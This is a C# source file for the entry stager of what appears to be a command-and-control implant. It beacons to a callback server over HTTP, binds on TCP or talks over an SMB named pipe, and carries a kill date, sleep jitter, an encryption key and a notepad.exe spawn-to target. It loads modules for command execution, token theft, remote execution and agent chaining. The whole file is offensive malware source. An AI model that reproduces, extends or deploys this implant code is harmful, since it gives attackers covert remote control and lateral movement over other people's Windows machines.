using Agent.Comms;
using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Modules;

using System;
using System.Net;

namespace Agent
{
    public class Stage
    {
        static string ID;
        static string ParentID;
        static byte[] EncryptionKey;

        public static void HTTPEntry(string AgentID, DateTime KillDate, string ConnectAddress, int ConnectPort, int SleepInterval, int SleepJitter, byte[] Key)
        {
            ID = AgentID;
            EncryptionKey = Key;

            var config = new ConfigController();
            config.Set(AgentConfig.KillDate, KillDate);
            config.Set(AgentConfig.SleepInterval, SleepInterval);
            config.Set(AgentConfig.SleepJitter, SleepJitter);

            var commModule = new HTTPCommModule(ID, ConnectAddress, ConnectPort);

            Execute(config, commModule);
        }

        public static void TCPEntry(string AgentID, string ParentAgentID, DateTime KillDate, string BindAddress, int BindPort, byte[] Key)
        {
            ID = AgentID;
            ParentID = ParentAgentID;
            EncryptionKey = Key;

            var config = new ConfigController();
            config.Set(AgentConfig.KillDate, KillDate);

            var commModule = new TCPCommModule(IPAddress.Parse(BindAddress), BindPort);

            Execute(config, commModule);
        }

        public static void SMBEntry(string AgentID, string ParentAgentID, DateTime KillDate, string PipeName, byte[] Key)
        {
            ID = AgentID;
            ParentID = ParentAgentID;
            EncryptionKey = Key;

            var config = new ConfigController();
            config.Set(AgentConfig.KillDate, KillDate);

            var commModule = new SMBCommModule(PipeName);

            Execute(config, commModule);
        }

        static void Execute(ConfigController Config, ICommModule CommModule)
        {
            Config.Set(AgentConfig.PPID, System.Diagnostics.Process.GetCurrentProcess().Id);
            Config.Set(AgentConfig.SpawnTo, @"C:\Windows\System32\notepad.exe");

            var crypto = new CryptoController(EncryptionKey);

            var agent = new AgentController(CommModule, crypto, Config)
            {
                AgentID = ID,
                ParentAgentID = ParentID
            };

            CommModule.Init(Config);
            CommModule.Start();

            agent.RegisterAgentModule(new CoreModule());
            agent.RegisterAgentModule(new NetModule());
            agent.RegisterAgentModule(new DirectoryModule());
            agent.RegisterAgentModule(new FileModule());
            agent.RegisterAgentModule(new DriveModule());
            agent.RegisterAgentModule(new EnvModule());
            agent.RegisterAgentModule(new ExecModule());
            agent.RegisterAgentModule(new ProcModule());
            agent.RegisterAgentModule(new TokenModule());
            agent.RegisterAgentModule(new RemoteExecModule());
            agent.RegisterAgentModule(new LinkModule());

            agent.Start();
        }
    }
}